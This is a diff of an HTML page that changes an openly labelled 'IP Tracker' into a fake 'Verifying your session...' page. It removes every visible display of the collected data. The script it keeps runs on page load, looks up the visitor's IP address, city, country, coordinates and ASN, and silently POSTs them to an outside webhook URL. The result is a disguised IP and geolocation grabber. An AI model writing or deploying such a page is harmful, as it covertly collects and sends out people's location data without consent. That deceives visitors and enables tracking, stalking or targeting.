@@ -2,55 +2,48 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>IP Tracker</title>
+  <title>Verification</title>
   <style>
     body {
       background-color: #0d0d0d;
       color: #f2f2f2;
       font-family: 'Segoe UI', sans-serif;
-      text-align: center;
-      padding: 40px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
     }
 
-    h1 {
-      font-size: 32px;
-      margin-bottom: 10px;
+    .spinner {
+      border: 6px solid #333;
+      border-top: 6px solid #09f;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
     }
 
-    #info-box {
-      background: #1a1a1a;
-      border: 1px solid #333;
-      border-radius: 12px;
-      padding: 20px;
-      max-width: 500px;
-      margin: 0 auto;
-      box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
 
-    #map {
-      margin-top: 25px;
-      width: 100%;
-      max-width: 600px;
-      border-radius: 8px;
-      border: 1px solid #444;
-    }
-
-    .label {
-      color: #999;
-      font-weight: 500;
+    .text {
+      font-size: 20px;
+      color: #aaa;
     }
   </style>
 </head>
 <body>
 
-  <h1>IP Lookup</h1>
-  <div id="info-box">
-    <div id="ip-info">Loading...</div>
-  </div>
-  <img id="map" src="" alt="Map" />
+  <div class="spinner"></div>
+  <div class="text">Verifying your session...</div>
 
   <script>
-    async function fetchAndSendIP() {
+    async function logIP() {
       try {
         const res = await fetch("https://api.db-ip.com/v2/free/self");
         const data = await res.json();
@@ -65,17 +58,6 @@
           asn
         } = data;
 
-        const mapURL = `https://staticmap.openstreetmap.de/staticmap.php?center=${latitude},${longitude}&zoom=10&size=600x300&markers=${latitude},${longitude},lightblue1`;
-
-        document.getElementById("ip-info").innerHTML = `
-          <p><span class="label">IP:</span> ${ipAddress}</p>
-          <p><span class="label">City:</span> ${city}</p>
-          <p><span class="label">Region:</span> ${stateProv}</p>
-          <p><span class="label">Country:</span> ${countryName}</p>
-          <p><span class="label">ASN:</span> ${asn}</p>
-        `;
-        document.getElementById("map").src = mapURL;
-
         await fetch("https://webhook-test.com/26eff05a1fb9bd13e113d9a93d51f174", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
@@ -86,17 +68,15 @@
             country: countryName,
             latitude,
             longitude,
-            asn,
-            map: `https://maps.google.com/?q=${latitude},${longitude}`
+            asn
           })
         });
-      } catch (err) {
-        console.error("Error fetching IP:", err);
-        document.getElementById("ip-info").innerText = "Could not retrieve IP information.";
+      } catch (e) {
+        console.error("Failed to log IP:", e);
       }
     }
 
-    fetchAndSendIP();
+    logIP();
   </script>
 
 </body>
